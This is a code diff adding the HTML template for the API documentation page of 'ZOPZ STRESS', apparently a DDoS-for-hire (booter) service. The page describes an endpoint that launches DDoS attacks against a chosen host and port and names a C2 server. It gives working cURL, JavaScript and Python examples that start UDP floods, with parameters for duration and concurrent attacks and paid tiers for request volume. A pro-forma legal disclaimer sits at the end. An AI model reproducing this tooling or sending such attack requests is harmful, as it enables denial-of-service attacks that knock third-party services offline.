@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZOPZ STRESS | API Documentation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        * { font-family: 'Inter', sans-serif; }
+        body { 
+            background: #0a0a0a;
+            background-attachment: fixed;
+        }
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #141414;
+            --bg-card: #141414;
+            --border-color: #1f1f1f;
+            --border-hover: #1f1f1f;
+            --accent-primary: #ffffff;
+            --accent-secondary: #9ca3af;
+        }
+        .nav-active { 
+            background: #141414; 
+            border: 1px solid #1f1f1f; 
+        }
+        .info-card { 
+            background: #141414; 
+            border: 1px solid #1f1f1f; 
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+            padding: 2rem;
+        }
+        .info-card:hover {
+            border-color: #1f1f1f;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        .section-header {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid #1f1f1f;
+        }
+        .note-box {
+            background: #141414;
+            border: 1px solid #1f1f1f;
+            border-left: 3px solid #ffffff;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+        }
+        .endpoint-box {
+            background: #0f0f0f;
+            border: 1px solid #1f1f1f;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        table tbody tr:hover {
+            background: #0f0f0f;
+        }
+        code {
+            background-color: #0f0f0f;
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.25rem;
+            font-family: 'Courier New', monospace;
+            color: #ffffff;
+            border: 1px solid #1f1f1f;
+        }
+        pre {
+            background-color: #0f0f0f;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            overflow-x: auto;
+            border: 1px solid #1f1f1f;
+        }
+        pre code {
+            background-color: transparent;
+            padding: 0;
+            color: #e5e7eb;
+            border: none;
+        }
+        table {
+            border-collapse: collapse;
+        }
+        table th, table td {
+            border: 1px solid #1f1f1f;
+        }
+    </style>
+</head>
+<body class="text-gray-100 min-h-screen">
+    <header class="border-b border-[#1f1f1f] bg-[#141414] sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 py-4">
+            <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 flex items-center justify-center bg-[#0f0f0f] rounded border border-[#1f1f1f]">
+                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                    </div>
+                    <h1 class="text-xl font-semibold text-white">ZOPZ STRESS</h1>
+                </div>
+                <nav class="flex flex-wrap items-center gap-1 w-full sm:w-auto justify-center sm:justify-end">
+                    <a href="/dashboard/user" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
+                        </svg>
+                        <span class="hidden sm:inline">Dashboard</span>
+                    </a>
+                    <a href="/dashboard/attack" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                        <span class="hidden sm:inline">Panel</span>
+                    </a>
+                    <a href="/dashboard/methods" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                        </svg>
+                        <span class="hidden sm:inline">Methods</span>
+                    </a>
+                    <a href="/dashboard/logs" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                        </svg>
+                        <span class="hidden sm:inline">AttackLogs</span>
+                    </a>
+                    <a href="/api-docs" class="nav-active px-3 sm:px-4 py-2 rounded text-white transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                        </svg>
+                        <span class="hidden sm:inline">API Docs</span>
+                    </a>
+                    <% if (typeof user !== 'undefined' && user && user.admin) { %>
+                    <a href="/admin/dashboard" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] border border-[#1f1f1f] transition-all flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                        </svg>
+                        <span class="hidden sm:inline">Admin</span>
+                    </a>
+                    <% } %>
+                </nav>
+                <div class="flex items-center gap-3 w-full sm:w-auto justify-end">
+                    <div class="relative" id="account-dropdown">
+                        <button onclick="toggleAccountDropdown()" class="px-3 sm:px-4 py-2 rounded text-[#9ca3af] hover:text-white hover:bg-[#141414] transition-all flex items-center gap-2 text-sm font-medium">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                            </svg>
+                            <span class="hidden sm:inline">Account</span>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                            </svg>
+                        </button>
+                        <div id="account-dropdown-menu" class="hidden absolute right-0 mt-2 w-48 bg-[#141414] border border-[#1f1f1f] rounded shadow-xl z-50">
+                            <a href="/dashboard/user" class="block px-4 py-3 text-sm text-[#9ca3af] hover:bg-[#0f0f0f] hover:text-white transition-all flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                                </svg>
+                                <span>Plan</span>
+                            </a>
+                            <a href="/login" class="block px-4 py-3 text-sm text-red-400 hover:bg-red-500/10 hover:text-red-300 transition-all flex items-center gap-2 border-t border-[#1f1f1f]">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
+                                </svg>
+                                <span>Logout</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
+        <% if (typeof message !== 'undefined' && message) { %>
+            <div class="mb-6 bg-[#141414] border border-green-500/30 rounded p-4 text-green-400 text-sm flex items-center gap-2">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                </svg>
+                <%= message %>
+            </div>
+        <% } %>
+        <% if (typeof error !== 'undefined' && error) { %>
+            <div class="mb-6 bg-[#141414] border border-red-500/30 rounded p-4 text-red-400 text-sm flex items-center gap-2">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+                <%= error %>
+            </div>
+        <% } %>
+
+        <div class="mb-10">
+            <h1 class="text-4xl sm:text-5xl font-semibold text-white mb-3">API Documentation</h1>
+            <p class="text-[#9ca3af] text-lg">Complete API reference for ZOPZ STRESS platform</p>
+        </div>
+
+        <!-- Overview -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Overview
+            </h2>
+            <p class="text-[#9ca3af] mb-6 leading-relaxed">
+                The ZOPZ STRESS API provides programmatic access to initiate DDoS attacks through a RESTful interface. All API requests must include authentication credentials.
+            </p>
+            <div class="endpoint-box">
+                <p class="text-[#9ca3af] mb-2"><strong class="text-white">Base URL:</strong> <code>https://zopzstress.st/api</code></p>
+                <p class="text-[#9ca3af]"><strong class="text-white">C2 Server:</strong> <code>proxy.zopzstress.st:10000</code></p>
+            </div>
+        </div>
+
+        <!-- Authentication -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                </svg>
+                Authentication
+            </h2>
+            <p class="text-[#9ca3af] mb-4 leading-relaxed">
+                Authentication is performed via query parameters in the API request:
+            </p>
+            <ul class="list-disc pl-6 text-[#9ca3af] mb-6 space-y-2">
+                <li><code>username</code>: Your account username</li>
+                <li><code>password</code>: Your account password</li>
+            </ul>
+            <div class="note-box">
+                <p class="text-white text-sm leading-relaxed"><strong>Note:</strong> Credentials are passed as query parameters. For production use, consider implementing token-based authentication.</p>
+            </div>
+        </div>
+
+        <!-- Endpoints -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                </svg>
+                Endpoints
+            </h2>
+            
+            <h3 class="text-xl font-semibold mb-2 text-white mt-8">Initiate Attack</h3>
+            <p class="text-[#9ca3af] mb-6 leading-relaxed">Initiates a DDoS attack against a specified target.</p>
+            
+            <div class="endpoint-box">
+                <p class="text-[#9ca3af] mb-2"><strong class="text-white">Endpoint:</strong> <code>GET /api/attack</code></p>
+                <p class="text-[#9ca3af]"><strong class="text-white">URL:</strong> <code>https://zopzstress.st/api/attack</code></p>
+            </div>
+
+            <h4 class="text-lg font-semibold mb-4 text-white mt-8">Query Parameters</h4>
+            <div class="overflow-x-auto mb-6">
+                <table class="w-full table-auto">
+                    <thead>
+                        <tr class="bg-[#0f0f0f] text-[#9ca3af]">
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Parameter</th>
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Type</th>
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Required</th>
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="border-b border-[#1f1f1f] hover:bg-[#0f0f0f] transition-colors">
+                            <td class="px-4 py-3"><code>username</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">string</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Your account username</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>password</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">string</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Your account password</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>host</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">string</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Target hostname or IP address</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>port</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">integer</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Target port number</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>time</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">integer</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Attack duration in seconds</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>method</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">string</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Yes</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Attack method to use</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>len</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">integer</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">No</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Optional length parameter (method-specific)</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>concurrents</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">integer</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">No</td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Number of concurrent attacks (1-10, default: 1)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h4 class="text-lg font-semibold mb-4 text-white mt-8">Available Attack Methods</h4>
+            <div class="endpoint-box mb-4">
+                <div id="methods-loading" class="text-[#9ca3af] italic">Loading methods...</div>
+                <ul id="methods-list" class="list-disc pl-6 text-[#9ca3af] space-y-2 hidden">
+                    <!-- Methods will be populated dynamically -->
+                </ul>
+            </div>
+            <p class="text-[#9ca3af] text-sm italic mb-8">Note: Available methods may vary based on your account permissions and server configuration.</p>
+
+            <h4 class="text-lg font-semibold mb-4 text-white mt-8">Request Examples</h4>
+            
+            <div class="mb-4">
+                <p class="text-[#9ca3af] mb-2 font-medium">cURL:</p>
+                <pre><code>curl "https://zopzstress.st/api/attack?username=username&password=password&host=example.com&port=80&time=60&method=UDP"</code></pre>
+            </div>
+
+            <div class="mb-4">
+                <p class="text-[#9ca3af] mb-2 font-medium">JavaScript (Axios):</p>
+                <pre><code>const axios = require('axios');
+
+const params = {
+  username: 'username',
+  password: 'password',
+  host: 'example.com',
+  port: 80,
+  time: 60,
+  method: 'UDP'
+};
+
+axios.get('https://zopzstress.st/api/attack', { params })
+  .then(response => {
+    console.log(response.data);
+  })
+  .catch(error => {
+    console.error(error);
+  });</code></pre>
+            </div>
+
+            <div class="mb-4">
+                <p class="text-[#9ca3af] mb-2 font-medium">Python (Requests):</p>
+                <pre><code>import requests
+
+url = "https://zopzstress.st/api/attack"
+params = {
+    "username": "username",
+    "password": "password",
+    "host": "example.com",
+    "port": 80,
+    "time": 60,
+    "method": "UDP"
+}
+
+response = requests.get(url, params=params)
+print(response.json())</code></pre>
+            </div>
+
+            <h4 class="text-lg font-semibold mb-4 text-white mt-8">Response Format</h4>
+            
+            <div class="mb-4">
+                <p class="text-[#9ca3af] mb-2 font-medium">Success Response (200 OK):</p>
+                <pre><code>{
+  "status": "success",
+  "message": "Attack initiated successfully",
+  "attack_id": "unique-attack-id",
+  "target": "example.com",
+  "port": 80,
+  "method": "UDP",
+  "duration": 60
+}</code></pre>
+            </div>
+
+            <div class="mb-4">
+                <p class="text-[#9ca3af] mb-2 font-medium">Error Response (400/401/500):</p>
+                <pre><code>{
+  "status": "error",
+  "message": "Error description",
+  "code": "ERROR_CODE"
+}</code></pre>
+            </div>
+
+            <h4 class="text-lg font-semibold mb-4 text-white mt-8">Error Codes</h4>
+            <div class="overflow-x-auto">
+                <table class="w-full table-auto">
+                    <thead>
+                        <tr class="bg-[#0f0f0f] text-[#9ca3af]">
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Code</th>
+                            <th class="px-4 py-3 text-left border border-[#1f1f1f] font-semibold">Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="border-b border-[#1f1f1f] hover:bg-[#0f0f0f] transition-colors">
+                            <td class="px-4 py-3"><code>INVALID_CREDENTIALS</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Username or password is incorrect</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>INVALID_HOST</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Target host is invalid or not allowed</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>INVALID_PORT</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Port number is out of valid range</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>INVALID_TIME</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Attack duration exceeds maximum allowed time</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>INVALID_METHOD</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Attack method is not available or not supported</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>ACCOUNT_EXPIRED</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">User account has expired</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>NO_API_ACCESS</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Account does not have API access enabled</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>RATE_LIMIT_EXCEEDED</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Too many requests in a short period</td>
+                        </tr>
+                        <tr class="border-b border-[#1f1f1f]">
+                            <td class="px-4 py-3"><code>SERVER_ERROR</code></td>
+                            <td class="px-4 py-3 text-[#9ca3af]">Internal server error</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- C2 Server Information -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2m-2-4h.01M17 16h.01"></path>
+                </svg>
+                C2 Server Information
+            </h2>
+            <div class="endpoint-box mb-6">
+                <p class="text-[#9ca3af] mb-2"><strong class="text-white">C2 Server:</strong> <code>proxy.zopzstress.st:10000</code></p>
+            </div>
+            <p class="text-[#9ca3af] mb-6 leading-relaxed">
+                The C2 (Command and Control) server is used for direct communication and attack coordination. This server operates on port 10000.
+            </p>
+            <div class="note-box">
+                <p class="text-white text-sm leading-relaxed"><strong>Note:</strong> Direct C2 server access may require additional authentication or connection protocols not documented in this REST API.</p>
+            </div>
+        </div>
+
+        <!-- Rate Limiting -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Rate Limiting
+            </h2>
+            <p class="text-[#9ca3af] mb-6 leading-relaxed">
+                API requests are subject to rate limiting to prevent abuse. Specific rate limits may vary based on your account tier and subscription level.
+            </p>
+            <div class="endpoint-box">
+                <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                    <li><strong class="text-white">Free tier:</strong> 10 requests per minute</li>
+                    <li><strong class="text-white">Premium tier:</strong> 100 requests per minute</li>
+                    <li><strong class="text-white">Enterprise tier:</strong> Unlimited</li>
+                </ul>
+            </div>
+            <p class="text-[#9ca3af] mt-6 leading-relaxed">
+                When rate limits are exceeded, the API will return a <code>429 Too Many Requests</code> status code.
+            </p>
+        </div>
+
+        <!-- Best Practices -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Best Practices
+            </h2>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-lg font-semibold mb-3 text-white">Security</h3>
+                    <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                        <li>Never expose your credentials in client-side code</li>
+                        <li>Use environment variables or secure credential storage</li>
+                        <li>Consider implementing token-based authentication for production</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-3 text-white">Error Handling</h3>
+                    <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                        <li>Always check response status codes</li>
+                        <li>Implement retry logic with exponential backoff</li>
+                        <li>Log errors for debugging purposes</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-3 text-white">Performance</h3>
+                    <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                        <li>Cache authentication tokens when possible</li>
+                        <li>Batch requests when initiating multiple attacks</li>
+                        <li>Monitor your rate limit usage</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-3 text-white">Compliance</h3>
+                    <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                        <li>Ensure you have authorization before attacking any target</li>
+                        <li>Only use this service for legitimate security testing</li>
+                        <li>Comply with all applicable laws and regulations</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Support -->
+        <div class="info-card rounded-lg mb-8">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                </svg>
+                Support
+            </h2>
+            <p class="text-[#9ca3af] mb-6 leading-relaxed">For API support, issues, or feature requests:</p>
+            <ul class="list-disc pl-6 text-[#9ca3af] space-y-2">
+                <li><strong class="text-white">Website:</strong> <a href="https://zopzstress.st" class="text-white hover:underline transition-colors">https://zopzstress.st</a></li>
+                <li><strong class="text-white">C2 Server:</strong> <code>proxy.zopzstress.st:10000</code></li>
+            </ul>
+        </div>
+
+        <!-- Legal Disclaimer -->
+        <div class="info-card rounded-lg">
+            <h2 class="section-header flex items-center gap-3">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                </svg>
+                Legal Disclaimer
+            </h2>
+            <p class="text-[#9ca3af] leading-relaxed">
+                This API is provided for authorized security testing and educational purposes only. Users are responsible for ensuring they have proper authorization before initiating any attacks. Unauthorized use of this service may violate local, state, and federal laws. The service provider is not responsible for misuse of this API.
+            </p>
+        </div>
+    </main>
+
+    <script>
+        function toggleAccountDropdown() {
+            const menu = document.getElementById('account-dropdown-menu');
+            menu.classList.toggle('hidden');
+        }
+
+        document.addEventListener('click', function(event) {
+            const dropdown = document.getElementById('account-dropdown');
+            const menu = document.getElementById('account-dropdown-menu');
+            if (!dropdown.contains(event.target)) {
+                menu.classList.add('hidden');
+            }
+        });
+
+        // Fetch attack methods dynamically from API
+        async function loadAttackMethods() {
+            const methodsList = document.getElementById('methods-list');
+            const methodsLoading = document.getElementById('methods-loading');
+            
+            try {
+                const response = await fetch('/api/methods');
+                const data = await response.json();
+                
+                if (data.success && data.methods && Array.isArray(data.methods)) {
+                    methodsLoading.classList.add('hidden');
+                    methodsList.classList.remove('hidden');
+                    
+                    // Clear existing items
+                    methodsList.innerHTML = '';
+                    
+                    // Populate methods
+                    data.methods.forEach(method => {
+                        const li = document.createElement('li');
+                        const methodName = method.name.toUpperCase();
+                        const vipBadge = method.vip ? '<span class="ml-2 px-2 py-0.5 bg-[#141414] border border-[#1f1f1f] text-white text-xs rounded">VIP</span>' : '';
+                        li.innerHTML = `<code>${methodName}</code>${vipBadge}`;
+                        methodsList.appendChild(li);
+                    });
+                } else {
+                    throw new Error('Invalid response format');
+                }
+            } catch (error) {
+                console.error('Error loading methods:', error);
+                methodsLoading.textContent = 'Failed to load methods. Please refresh the page.';
+                methodsLoading.classList.add('text-red-400');
+            }
+        }
+        
+        // Load methods when page loads
+        document.addEventListener('DOMContentLoaded', loadAttackMethods);
+    </script>
+</body>
+</html>
